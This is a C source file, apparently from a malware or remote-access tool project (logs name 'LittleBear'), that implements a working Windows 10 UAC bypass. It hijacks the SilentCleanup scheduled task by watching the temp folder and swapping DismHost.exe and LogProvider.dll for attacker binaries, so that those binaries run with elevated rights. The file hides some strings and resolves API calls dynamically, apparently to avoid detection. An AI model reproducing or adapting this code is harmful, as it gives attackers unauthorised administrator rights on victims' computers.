#include <windows.h>
#include "PublicVar.h"



typedef struct
{
	HANDLE hEvent;
	DWORD dwCpuBits;
}WIN10CLEANUPWATCHERDATA,*LPWIN10CLEANUPWATCHERDATA;


DWORD WINAPI Win10CleanupFolderWatcher(LPVOID lpstData)
{
	WIN10CLEANUPWATCHERDATA stData = * (LPWIN10CLEANUPWATCHERDATA)lpstData;
	WriteLittleBearLog("Win10CleanupFolderWatcher is starting\r\n");

	char  szReplaceDll[MAX_PATH];
	char  szReplaceExe[MAX_PATH];
	int iCpuBitsCnt = stData.dwCpuBits;
	if (iCpuBitsCnt == 32)
	{
		lplstrcpyA(szReplaceDll,"win10bypassuac32.dll");
		lplstrcpyA(szReplaceExe,"myexe.exe");
		//szReplaceDll = "win10bypassuac32.dll";
	}
	else if (iCpuBitsCnt == 64)
	{
		lplstrcpyA(szReplaceDll,"win10bypassuac64.dll");
		lplstrcpyA(szReplaceExe,"myexe64.exe");
		//szReplaceDll = "win10bypassuac64.dll";
	}
	
	DWORD cbBytes = 4096;
	char file_name[MAX_PATH];
	char notify[FILE_OPER_NOTYFY_SIZE];

	char szFullDllPathName[MAX_PATH];
	char szCurUserAppdData[MAX_PATH];
	char szCurUserAppdDataFormat[] = {'c',':','\\','U','s','e','r','s','\\','%','s','\\',
		'A','p','p','D','a','t','a','\\','l','o','c','a','l','\\','t','e','m','p','\\',0};
	lpwsprintfA(szCurUserAppdData,szCurUserAppdDataFormat,strUserName);

	char szShowInfo[1024];
	lpwsprintfA(szShowInfo,"the bypassuac win10 watcher thread is watching: %s\r\n",szCurUserAppdData);
	WriteLittleBearLog(szShowInfo);

	//若网络重定向或目标文件系统不支持该操作，函数失败，同时调用GetLastError()返回ERROR_INVALID_FUNCTION
	HANDLE dirHandle = lpCreateFileA(szCurUserAppdData,GENERIC_READ | GENERIC_WRITE | FILE_LIST_DIRECTORY,
		FILE_SHARE_READ | FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_FLAG_BACKUP_SEMANTICS,NULL);
	if(dirHandle == INVALID_HANDLE_VALUE) 
	{
		int iError = lpRtlGetLastWin32Error();
		char strBuf[4096];
		lpwsprintfA(strBuf,"Win10CleanupFolderWatcher lpCreateFileA error,error code is:%u maybe the path is not exist\r\n",iError);
		WriteLittleBearLog(strBuf);
		return FALSE;
	}

	
	FILE_NOTIFY_INFORMATION *pnotify = (FILE_NOTIFY_INFORMATION*)notify; 
	int iRet = 0;

	char szLogProviderdll[] = "Provider.dll";	//"LogProvider.dll"

	char szDismHostexe[] = "DismHost.exe";

	while(TRUE)
	{   
		lpRtlZeroMemory(notify,FILE_OPER_NOTYFY_SIZE);
		iRet = lpReadDirectoryChangesW(dirHandle,&notify,FILE_OPER_NOTYFY_SIZE,TRUE,
			FILE_NOTIFY_CHANGE_FILE_NAME 
			|FILE_NOTIFY_CHANGE_DIR_NAME
			|FILE_NOTIFY_CHANGE_ATTRIBUTES 
			|FILE_NOTIFY_CHANGE_SIZE
			|FILE_NOTIFY_CHANGE_LAST_WRITE
			|FILE_NOTIFY_CHANGE_LAST_ACCESS
			|FILE_NOTIFY_CHANGE_CREATION
			|FILE_NOTIFY_CHANGE_SECURITY,
			&cbBytes,NULL,NULL);
		if(iRet > 0)
		{
			if(pnotify->FileName)
			{
				lpRtlZeroMemory(file_name,MAX_PATH);
				iRet = lpWideCharToMultiByte(CP_ACP,0,pnotify->FileName,pnotify->FileNameLength/2,file_name,MAX_PATH,NULL,NULL);
				if (iRet <= 0)
				{
					WriteLittleBearLog("Win10CleanupFolderWatcher lpWideCharToMultiByte error\r\n");
					continue;
				}
			}

// 			if(pnotify->NextEntryOffset !=0 && (pnotify->FileNameLength > 0 && pnotify->FileNameLength < MAX_PATH)) 
// 			{ 
// 				PFILE_NOTIFY_INFORMATION p = (PFILE_NOTIFY_INFORMATION)((char*)pnotify+pnotify->NextEntryOffset); 
// 				lpRtlZeroMemory(file_rename,sizeof(file_rename) ); 
// 				lpWideCharToMultiByte(CP_ACP,0,p->FileName,p->FileNameLength/2,file_rename,MAX_PATH,NULL,NULL ); 
// 			} 

			if(pnotify->Action == FILE_ACTION_ADDED || pnotify->Action == FILE_ACTION_MODIFIED || pnotify->Action == FILE_ACTION_REMOVED ||
				pnotify->Action == FILE_ACTION_RENAMED_NEW_NAME || pnotify->Action == FILE_ACTION_RENAMED_NEW_NAME)
			{
				//file_rename
				if (lplstrcmpA(file_name + lplstrlenA(file_name) - lplstrlenA(szLogProviderdll),szLogProviderdll) == 0)
				{
					lpwsprintfA(szFullDllPathName,"%s%s",szCurUserAppdData,file_name);
					iRet = lpDeleteFileA(szFullDllPathName);
					if (iRet == 0)
					{
						char szShowInfo[1024];
						lpwsprintfA(szShowInfo,"bypassuac win10 watcher thread lpDeleteFileA error code:%u\r\n",lpRtlGetLastWin32Error());
						WriteLittleBearLog(szShowInfo);
					}

					char szReplaceDllPathName[MAX_PATH];
					lpwsprintfA(szReplaceDllPathName,"%s%s",strDataPath,szReplaceDll);



					iRet = lpCopyFileA(szReplaceDllPathName,szFullDllPathName,0);
					if (iRet == 0)
					{
						char szShowInfo[1024];
						lpwsprintfA(szShowInfo,"bypassuac win10 watcher thread lpCopyFileA error code:%u\r\n",lpRtlGetLastWin32Error());
						WriteLittleBearLog(szShowInfo);
					}
					char szShowInfo[1024];
					lpwsprintfA(szShowInfo,"Find cleanup last file loaded,the last file is:%s, the replace file is:%s\r\n",szFullDllPathName,szReplaceDllPathName);
					WriteLittleBearLog(szShowInfo);

					//the last file to copy,so the thread can exit
					//lpCloseHandle(dirHandle);
					//lpSetEvent(stData.hEvent);
					//WriteLittleBearLog("bypassuac win10 watcher thread work end\r\n");
					//return TRUE;
				}
				else if (lplstrcmpA(file_name + lplstrlenA(file_name) - lplstrlenA(szDismHostexe),szDismHostexe) == 0)
				{
// 					char szSubPath[MAX_PATH];
// 					GetPathFromFullName(file_name,szSubPath);
// 					lplstrcatA(szSubPath,"LogProvider.dll");
// 					lpwsprintfA(szFullDllPathName,"%s%s",szCurUserAppdData,szSubPath);

					lpwsprintfA(szFullDllPathName,"%s%s",szCurUserAppdData,file_name);
					iRet = lpDeleteFileA(szFullDllPathName);
					if (iRet == 0)
					{
						char szShowInfo[1024];
						lpwsprintfA(szShowInfo,"bypassuac win10 watcher thread lpDeleteFileA error code:%u\r\n",lpRtlGetLastWin32Error());
						WriteLittleBearLog(szShowInfo);
					}

					char szReplaceDllPathName[MAX_PATH];
					lpwsprintfA(szReplaceDllPathName,"%s%s",strDataPath,szReplaceExe);

					iRet = lpCopyFileA(szReplaceDllPathName,szFullDllPathName,0);
					if (iRet == 0)
					{
						char szShowInfo[1024];
						lpwsprintfA(szShowInfo,"bypassuac win10 watcher thread lpCopyFileA error code:%u\r\n",lpRtlGetLastWin32Error());
						WriteLittleBearLog(szShowInfo);
					}

					char szShowInfo[1024];
					lpwsprintfA(szShowInfo,"Find cleanup first file loaded,the first file is:%s, the replace file is:%s\r\n",szFullDllPathName,szReplaceDllPathName);
					WriteLittleBearLog(szShowInfo);
				}
			}
		}   
	}
	lpCloseHandle(dirHandle);
	WriteLittleBearLog("bypassuac win10 watcher thread work end\r\n");;
	return TRUE;
}










//32bit or 64?
DWORD __stdcall BypassUacWin10Cleanup(LPVOID lpCpuBits)
{	
	
	char szCmdFile[MAX_PATH];
	ModifyModuleFileName(szCmdFile,CMD_OUTPUT_FILE_NAME);

	char szCmdQueryFormat[] = "cmd /c schtasks /query /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup >> %s";
	char szCmdQuery[MAX_PATH];
	int iRet = lpwsprintfA(szCmdQuery,szCmdQueryFormat,szCmdFile);
	iRet = lpWinExec(szCmdQuery,SW_HIDE);
	if (iRet <= 32)
	{
		WriteLittleBearLog("BypassUacWin10Cleanup lpWinExec error\r\n");
		return FALSE;
	}
	
	HANDLE hCmdOutPutFile = INVALID_HANDLE_VALUE;
	while(hCmdOutPutFile == INVALID_HANDLE_VALUE)
	{
		lpSleep(1000);
		hCmdOutPutFile = lpCreateFileA(szCmdFile,GENERIC_WRITE|GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	}
	DWORD dwHighSize = 0;
	int iSize = lpGetFileSize(hCmdOutPutFile,&dwHighSize);
	if (iSize == 0)
	{
		lpCloseHandle(hCmdOutPutFile);
		WriteLittleBearLog("BypassUacWin10Cleanup lpGetFileSize error\r\n");
		return FALSE;
	}
	char szQueryResult[4096] = {0};
	DWORD dwCnt = 0;
	iRet = lpReadFile(hCmdOutPutFile,szQueryResult,iSize,&dwCnt,0);
	if (iRet == 0)
	{
		lpCloseHandle(hCmdOutPutFile);
		WriteLittleBearLog("BypassUacWin10Cleanup lpReadFile error\r\n");
		return FALSE;
	}
	lpCloseHandle(hCmdOutPutFile);

	if (strstr(szQueryResult,"正在运行"))
	{
		char szCmdEnd[] = "cmd /c schtasks /end /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup";
		iRet = lpWinExec(szCmdEnd,SW_HIDE);
		if (iRet <= 32)
		{
			WriteLittleBearLog("BypassUacWin10Cleanup lpWinExec error\r\n");
			return FALSE;
		}
		lpSleep(3000);
		WriteLittleBearLog("BypassUacWin10Cleanup task is in running\r\n");
	}
	else if(strstr(szQueryResult,"就绪"))
	{
		WriteLittleBearLog("BypassUacWin10Cleanup task is in ready\r\n");
	}
	else
	{
		WriteLittleBearLog("BypassUacWin10Cleanup szQueryResult error\r\n");
	}


	WIN10CLEANUPWATCHERDATA stData;
	stData.hEvent = lpCreateEventA(0,0,0,"win10bypassuaccleanup_event");
	stData.dwCpuBits = *(DWORD*) lpCpuBits;
	HANDLE hWather = lpCreateThread(0,0,(LPTHREAD_START_ROUTINE)Win10CleanupFolderWatcher,(LPVOID)&stData,0,0);
	if (hWather == 0)
	{
		WriteLittleBearLog("BypassUacWin10Cleanup lpCreateThread error\r\n");
		lpCloseHandle(stData.hEvent);
		return FALSE;
	}
	lpCloseHandle(hWather);
	WriteLittleBearLog("BypassUacWin10Cleanup lpCreateThread ok\r\n");

	char szRunCleanupCmdFormat[] = "cmd /c schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I > %s";
	char szRunCleanupCmd[1024];
	lpwsprintfA(szRunCleanupCmd,szRunCleanupCmdFormat,szCmdFile);
	iRet = lpWinExec(szRunCleanupCmd,SW_HIDE);
	if (iRet <= 32)
	{
		WriteLittleBearLog("BypassUacWin10Cleanup lpWinExec error\r\n");
		lpCloseHandle(stData.hEvent);
		return FALSE;
	}
	else
	{
		WriteLittleBearLog("BypassUacWin10Cleanup lpWinExec ok\r\n");
	}

	iRet = lpWaitForSingleObject(stData.hEvent,INFINITE);
	if (iRet = WAIT_OBJECT_0)
	{
		lpCloseHandle(stData.hEvent);
		return TRUE;
	}
	lpCloseHandle(stData.hEvent);
	return FALSE;
}